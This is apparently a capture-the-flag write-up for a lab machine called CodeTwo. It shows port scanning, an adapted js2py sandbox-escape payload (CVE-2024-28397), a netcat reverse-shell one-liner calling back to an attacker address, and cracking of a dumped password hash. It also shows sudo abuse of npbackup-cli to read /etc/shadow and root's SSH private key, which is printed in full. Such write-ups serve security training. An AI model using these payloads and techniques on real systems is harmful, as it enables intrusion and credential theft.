---
hidden: true
---

# CodeTwo

## Machine Info





## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.11.82 -oN port_scan.txt

Nmap scan report for 10.10.11.82
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



## Initial Access

### Web Enumeration

The machine has a http service on port 8000 with a service called CodeTwo.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The button "Download App" allows a user to download the source code of the application.

The application is a Javascript sandbox where a user can execute a Js scripts in this page once logged in.

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### Code analyze and Command Injection

Analizing the app's source code we can found these interesting informations:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

The app is made in Flask and it use the library `js2py` to execute Js code. The version of the package used is `0.74`.

Searching online, there is a CVE called CVE-2024-28397 with a RCE vulnerability for this version.&#x20;

{% embed url="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py" %}

Taking the payload and adapt it to the victim application.

```javascript
let cmd = "id"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)

let out = n11.communicate()[0].decode("utf-8")

"" + out
```

{% hint style="info" %}
From the original payload i added a utf-8's decode from the first element of the array to make a way that the payload will execute the command in the sandbox and then print the correct output in the page.
{% endhint %}

Executing this payload we can execute arbitrary command to the target machine.

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Now change the cmd var to a reverse shell and execute the js script.

{% code overflow="wrap" %}
```javascript
cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.49 9009 >/tmp/f"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

In this way we got a reverse shell to the target machine as `app` user.



### User Privilege Escalation

Once inside, search the local db used by application for discover credentials.

```bash
cd /home/app/app/instance/
sqlite3 users.db
```

Then get all from the users table.

```sql
SELECT * FROM user;
```

From there we can extract 2 credentials; for the app user and for marco's user

```
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

Using CrackStation we crack the marco passwrd:

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```
marco:sweetangelbabylove
```

Using the SSH open port try to connect to the target machine as marco

```bash
ssh marco@10.10.11.82
> sweetangelbabylove
```

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

We are in as marco's user.&#x20;

### User flag

```bash
cat /home/marco/user.txt
```



## Privilege Escalation

Looking the marco's group, we can see that he is inside the backup group.

```bash
id

uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
```

Checking the sudo rights, marco has the sudo rights to the `npbackup-cli` tool

```bash
sudo -l

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

### Misconfigurate Backup rights

Editing the backup configuration file from the marco's home directory we can use this tool to backup the /root directory and the /etc/shadow file.&#x20;

```bash
nano npbackup.conf
```

```
[..snip..]
    backup_opts:
      paths:
      - /home/app/app/
      - /root/
      - /etc/shadow
[..snip..]
```

Now using this conf file run another backup

```bash
sudo npbackup-cli -c npbackup.conf -b
```

Read the backup files inside these directories

```bash
sudo npbackup-cli -c npbackup.conf --ls
```

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Looking the backuped file, our target became the root's private key.

Using the `dump` function from the cli tool we can dump a file inside the latest snapshot.

<pre class="language-bash"><code class="lang-bash">sudo npbackup-cli -c npbackup.conf --dump /root/.ssh/id_rsa

<strong>-----BEGIN OPENSSH PRIVATE KEY-----
</strong>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
-----END OPENSSH PRIVATE KEY-----
</code></pre>

Save the key into a file in our attack machine, and give it the right permissions to make access through SSH

```bash
nano id_rsa
chmod +x id_rsa
```

Using this private key, we can make access as root user into target machine.

```bash
ssh -i id_rsa root@10.10.11.82
```

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



### Root flag

```bash
cat root.txt
```

